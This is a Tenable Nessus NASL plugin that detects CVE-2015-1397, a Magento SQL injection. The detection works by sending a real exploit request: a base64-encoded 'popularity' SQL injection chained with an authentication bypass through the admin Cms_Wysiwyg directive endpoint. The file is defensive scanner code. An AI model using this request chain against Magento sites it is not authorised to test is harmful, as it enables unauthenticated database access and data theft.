#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(83304);
  script_version("1.8");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2015-1397");
  script_bugtraq_id(74298);

  script_name(english:"Magento Mage_Adminhtml_Block_Report_Search_Grid Class 'popularity' Parameter SQLi");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected by
a SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Magento application running on the remote web server is affected
by a SQL injection vulnerability due to failing to properly sanitized
the user-supplied range inputs to the 'popularity' parameter of the
Mage_Adminhtml_Block_Report_Search_Grid class. An unauthenticated,
remote attacker can exploit this to execute arbitrary SQL statements
against the back-end database, leading to the execution of arbitrary
code, manipulation of data, or disclosure of sensitive information.

Note that the application is reportedly also affected by an
authentication bypass vulnerability as well as a remote file-include
vulnerability. The attack demonstrated here chains the authentication
bypass vulnerability with the SQL injection vulnerability to execute
a SQL query against the back-end database.");
  script_set_attribute(attribute:"see_also", value:"https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/");
  script_set_attribute(attribute:"see_also", value:"https://magento.com/security-patch");
  script_set_attribute(attribute:"solution", value:
"Apply the SUPEE-5344 security patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2015-1397");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/04/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/02/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/05/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:magentocommerce:magento");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:magento:magento");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("magento_detect.nbin");
  script_require_keys("www/PHP", "installed_sw/Magento");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Magento";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

sql_str = 'popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);';

postdata = "filter=" + base64(str:sql_str) + "&___directive=" +
  base64(str:"{{block type=Adminhtml/report_search_grid output=getCsvFile}}")
  + "&forwarded=1";

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : dir + "/index.php/admin/Cms_Wysiwyg/directive/index/",
  data   : postdata,
  add_headers :make_array("Content-Type","application/x-www-form-urlencoded"),
  exit_on_fail : TRUE
);

# Check for a PNG image file type. Patched instances will return a login page
# http://www.w3.org/TR/PNG-Structure.html
# First 8 bytes contain the following (decimal) values:
# 137 80 78 71 13 10 26 10 which turns to 89 50 4e 47 0d 0a 1a 0a in hex
if (hexstr(res[2]) =~ "^89504e470d0a1a0a")
{
  rep_extra = 
    '\nNote that a patched ' +app+ ' install will return a login page, while' +
    '\na vulnerable install will return a malformed PNG image.';

  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    line_limit : 2,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(http_last_sent_request()),
    output     : chomp(res[2]),
    rep_extra  : rep_extra
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
